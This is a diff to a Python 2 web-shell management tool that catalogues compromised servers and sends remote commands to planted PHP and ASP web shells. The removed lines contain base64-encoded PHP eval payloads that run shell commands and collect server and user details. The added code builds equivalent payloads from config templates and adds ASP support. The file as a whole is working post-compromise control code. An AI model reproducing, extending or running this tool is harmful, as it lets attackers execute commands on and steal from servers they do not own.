@@ -11,19 +11,18 @@ Pwd = "."
 Password = ""
 Prompt = "$"
 System = "Linux"
-Shell_Bin = "/bin/sh"
 Shell_Url = ""
 Shell_Type = ""
 Shell_Pass = ""
 Shell_Method = ""
 MainCommandList = None
 
-ShellCodeHead = "%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D"
 def DelCache():
     try:
         os.remove("./Data/shells_d.db")
     except Exception,e:
         pass
+
 def PromptInit():
     if System == "Windows":
         Core.Controller.Prompt = Pwd + ">"
@@ -34,6 +33,11 @@ def DbCommit():
     global DbConn
     DbConn.commit()
     Core.Rc4.Rc4File("./Data/shells_d.db", "./Data/shells.db", Password)
+
+def PasswordChange(newPass):
+    global Password
+    Password = newPass
+    DbCommit()
 
 def AddGroup(name):
 	DbCur.execute("insert into SGroup values('%s');" % name)
@@ -98,12 +102,19 @@ def ShowShells():
 		print "ID:%s Name:%s  Group:%s  Url:%s  Method:%s  Type:%s" % (c[0],c[1],c[2],c[3],c[4],c[5])
 
 
-def Shell_Info():
+def Shell_Info_PHP():
     global Pwd
     global System
     System = ""
-    shellcode = "%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D"
-    sendData = Shell_Pass + "=" + shellcode
+
+    php_head = Core.Config.GetConfig("SM","shellcode","php_head")
+    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
+    shellcode = Shell_Pass + "=" + urllib.quote(php_head)
+
+    php_info = Core.Config.GetConfig("SM","shellcode","php_info")
+    shellcode += "&x0=" +  urllib.quote(base64.b64encode(php_info+php_tail))
+
+    sendData = shellcode
     if Shell_Method == "GET":
         url = url + "?" + sendData
     
@@ -120,7 +131,7 @@ def Shell_Info():
     Pwd = retInfo[0]
     driveInfo = retInfo[1]
     SystemInfo = retInfo[2]
-    print "DriveInfo:%s\r\nSystemInfo:%s" % (driveInfo,SystemInfo)
+    print "Win_DriveInfo:%s\r\nSystemInfo:%s" % (driveInfo,SystemInfo)
     if SystemInfo.find("Windows") >= 0:
         global Shell_Bin
         global Prompt
@@ -128,82 +139,193 @@ def Shell_Info():
         Prompt = ">"
         Pwd = Pwd.replace("/","\\")
 
+def Shell_Info_ASP():
+    global Pwd
+    asp_head = Core.Config.GetConfig("SM","shellcode","asp_head")
+    asp_tail = Core.Config.GetConfig("SM","shellcode","asp_tail")
+    shellcode = Shell_Pass + "=" + asp_head
 
-def Shell_Cmd(cmd):
-	global Pwd
-        z1 = urllib.quote(base64.b64encode("/bin/sh"))
-        z2 = urllib.quote(base64.b64encode('cd "%s";%s;echo [S];pwd;echo [E]' % (Pwd, cmd)))
-        if System == "Windows":
-            z1 = urllib.quote(base64.b64encode("cmd"))
-            z2 = urllib.quote(base64.b64encode('cd /d "%s"&%s&echo [S]&cd&echo [E]' % (Pwd, cmd)))
+    asp_info = Core.Config.GetConfig("SM","shellcode","asp_info")
+    shellcode += asp_info.encode("hex") + asp_tail
 
-        #z1 = urllib.quote(base64.b64encode("cmd"))
-        #z2 = urllib.quote(base64.b64decode('cd /d "%s"&%s&echo [S]&cd&echo [E]' % (Pwd, cmd)))
+    sendData = shellcode
+    if Shell_Method == "GET":
+        url = url + "?" + sendData
+    
+    httpClient = Core.Http.HttpClient(Shell_Url)
+    httpClient.Method = Shell_Method
+    httpClient.PostData = sendData
+    retContent = httpClient.GetString()
 
-	shellcode = ShellCodeHead + "&z1=" + z1 + "&z2=" + z2
-	sendData = Shell_Pass + "=" + shellcode
-	#print sendData
-	if Shell_Method == "GET":
-		url = url + "?" + sendData
+    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
+    if retContent == "":
+        print retContent
+        return
 
-	httpClient = Core.Http.HttpClient(Shell_Url)
-	httpClient.Method = Shell_Method
-	httpClient.PostData = sendData
-        try:
-	    retContent =  httpClient.GetString()
-        except Exception,e:
-            print "Timed out!"
-            return
+    retInfo = retContent.split("\t")
+    Pwd = retInfo[0]
+    driveInfo = retInfo[1]
+    print "Win_DriveInfo:%s" % driveInfo
+    global System
+    global Shell_Bin
+    global Prompt
+    System = "Windows"
+    Prompt = ">"
+    Pwd = Pwd.replace("/","\\")
 
-        retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
-        #print retContent + "\r\n\r\n"
-        echo = ""
-        if retContent.find("[S]") > 0:
-            echo = retContent[:retContent.find("[S]")-1]
-	Pwd = retContent[retContent.find("[S]")+4:retContent.find("[E]")-1]
+def Shell_Info():
+    if Shell_Type == "PHP":
+        return Shell_Info_PHP()
+    if Shell_Type == "ASP":
+        return Shell_Info_ASP()
+    else:
+        print "Faild type!"
+
+
+def Shell_Cmd_PHP(cmd):
+    global Pwd
+    php_head = Core.Config.GetConfig("SM","shellcode","php_head")
+    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
+    shellcode = Shell_Pass + "=" + urllib.quote(php_head)
+    
+    php_cmd = Core.Config.GetConfig("SM","shellcode","php_cmd")
+
+    shell_bin = "/bin/sh"
+    shell_cmd = 'cd "%s";%s;echo [S];pwd;echo [E]' % (Pwd, cmd)
+
+    if System == "Windows":
+        shell_bin = "cmd"
+        shell_cmd = 'cd /d "%s"&%s&echo [S]&cd&echo [E]' % (Pwd, cmd)
+
+    php_cmd = php_cmd.replace("#shell_bin#", base64.b64encode(shell_bin))
+    php_cmd = php_cmd.replace("#shell_cmd#", base64.b64encode(shell_cmd))
+
+    shellcode += "&x0=" + urllib.quote(base64.b64encode(php_cmd+php_tail))
+
+    sendData = shellcode
+    #print sendData
+    if Shell_Method == "GET":
+            url = url + "?" + sendData
+
+    httpClient = Core.Http.HttpClient(Shell_Url)
+    httpClient.Method = Shell_Method
+    httpClient.PostData = sendData
+    try:
+        retContent =  httpClient.GetString()
+    except Exception,e:
+        print e
+        return
+
+    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
+    
+    echo = "Remote command faild!"
+
+    if retContent != "":
+        if retContent.find("[S]") >= 0:
+            if retContent.find("[S]") == 0:
+                echo = ""
+            else:
+                echo = retContent[:retContent.find("[S]")-1]
+        Pwd = retContent[retContent.find("[S]")+4:retContent.find("[E]")-1]
         Pwd = Pwd.replace("\r","")
         Pwd = Pwd.replace("\n","")
 
         PromptInit()
-	return echo
+
+    return echo
+
+def Shell_Cmd_ASP(cmd):
+    global Pwd
+    asp_head = Core.Config.GetConfig("SM","shellcode","asp_head")
+    asp_tail = Core.Config.GetConfig("SM","shellcode","asp_tail")
+    shellcode = Shell_Pass + "=" + asp_head
+
+    shell_cmd = 'cd /d "%s"&%s&echo [S]&cd&echo [E]' % (Pwd,cmd)
+    asp_cmd = Core.Config.GetConfig("SM","shellcode","asp_cmd")
+    asp_cmd = asp_cmd.replace("#shell_cmd#", shell_cmd.encode("hex"))
+
+    shellcode += asp_cmd.encode("hex") + asp_tail
+
+    sendData = shellcode
+    #print sendData
+    if Shell_Method == "GET":
+            url = url + "?" + sendData
+
+    httpClient = Core.Http.HttpClient(Shell_Url)
+    httpClient.Method = Shell_Method
+    httpClient.PostData = sendData
+    try:
+        retContent =  httpClient.GetString()
+    except Exception,e:
+        print e
+        return
+
+    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
+    
+    echo = "Remote command faild!"
+
+    if retContent != "":
+        if retContent.find("[S]") >= 0:
+            if retContent.find("[S]") == 0:
+                echo = ""
+            else:
+                echo = retContent[:retContent.find("[S]")-1]
+        Pwd = retContent[retContent.find("[S]")+4:retContent.find("[E]")-1]
+        Pwd = Pwd.replace("\r","")
+        Pwd = Pwd.replace("\n","")
+
+        PromptInit()
+
+    return echo
+
+    
+
+def Shell_Cmd(cmd):
+    if Shell_Type == "PHP":
+        return Shell_Cmd_PHP(cmd)
+    if Shell_Type == "ASP":
+        return Shell_Cmd_ASP(cmd)
+    else:
+        print "Faild type!"
+	
 
 def Shell_Cmd_Exit():
     Core.Command.CommandList = MainCommandList
     Core.Controller.Prompt = ">"
 
-def OtherCommand(command):
+def DirChange(path):
     global Pwd
-    cmds = command.split(" ")
+
     if System == "Windows":
         sep = "\\"
     else:
         sep = "/"
 
+    if path == "..":
+        if Pwd[len(Pwd)-1:] != ":":
+                pwd = ""
+                pwd = Pwd[:len(Pwd)-1]
 
-    if len(cmds) == 2:
-        if cmds[0] == "cd":
-            if cmds[1] == "..":
-                print Pwd
-                if Pwd[len(Pwd)-1:] != ":":
-                        pwd = ""
-                        pwd = Pwd[:len(Pwd)-1]
-
-                Pwd = Pwd[:pwd.rfind(sep)] + sep
+        Pwd = Pwd[:pwd.rfind(sep)] + sep
+        PromptInit()
+        return
+    
+    if path != "":
+        if System == "Windows":
+            if path.find(":") > 0:
+                Pwd = path
                 PromptInit()
                 return
-            
-            if cmds[1] != "":
-                if System == "Windows":
-                    if cmds[1].find(":") > 0:
-                        Pwd = cmds[1]
-                        PromptInit()
-                        return
-                else:
-                    if cmds[1][len(cmds[1])-1:] == "/":
-                        Pwd = cmds[1]
-                        PromptInit()
-                        return
-                             
+        else:
+            if path[0:1] == "/":
+                Pwd = path
+                PromptInit()
+                return
+
+
+def OtherCommand(command):
+    global Pwd
+    cmds = command.split(" ")
 
     if command != "":
         print Shell_Cmd(command)
@@ -232,6 +354,10 @@ def UseShell(argv):
             global MainCommandList
             MainCommandList = Core.Command.CommandList
             Core.Command.CommandList = []
+            Core.Command.CommandAdd("scdir", DirChange, "Change the current directory\r\n   Use:cdir [..|PATH]")
+            Core.Command.CommandAdd("slist", DirChange, "List directory contents")
+            Core.Command.CommandAdd("sget", DirChange, "Get the file")
+            Core.Command.CommandAdd("sup", DirChange, "Upload the file")
             Core.Command.CommandAdd("exit", Shell_Cmd_Exit, "Exit this shell")
             Core.Command.CommandAdd("help", Core.Command.CommandShow, "Show the command list")
             Core.Command.CommandAdd("other", OtherCommand, "Remote Command")
@@ -274,11 +400,12 @@ def DataInit():
             DbCommit()
 
 def Init():
-	DataInit()
+	Core.Controller.InitFuns.append(DataInit)
 	Core.Command.CommandAdd("add group",AddGroup, "Add shell group.\r\n   Use:add group [name]")
 	Core.Command.CommandAdd("add shell", AddShell, "Add shell")
 	Core.Command.CommandAdd("show groups", ShowGroups, "Show the shell groups")
 	Core.Command.CommandAdd("show shells", ShowShells, "Show the shells list")
 	Core.Command.CommandAdd("del group", DelGroup, "Delete the group")
 	Core.Command.CommandAdd("use shell", UseShell, "Use the shell\r\n   Use:use shell [id|name]")
+        Core.Command.CommandAdd("pass", PasswordChange, "Change the passsword\r\n   Use:pass newpassword")
         Core.Controller.ExitFuns.append(DelCache)	
